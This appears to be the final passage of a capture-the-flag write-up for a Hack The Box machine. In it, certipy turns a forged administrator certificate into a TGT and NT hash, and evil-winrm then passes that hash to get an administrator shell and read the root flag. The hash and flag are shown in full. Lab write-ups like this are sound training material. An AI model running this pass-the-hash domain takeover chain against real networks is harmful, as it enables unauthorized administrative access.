[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.172.213
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sendai.vl'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
```

now let’s authenticate 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ evil-winrm -i sendai.vl -u 'Administrator' -H 'cfb106feec8b89a3d98e14dcbe8d087a'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls

    Directory: C:\Users\Administrator\desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/15/2025   8:27 PM             32 root.txt

*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
1bc134a7b4ae19fcc072082026d991cf
```

DONE!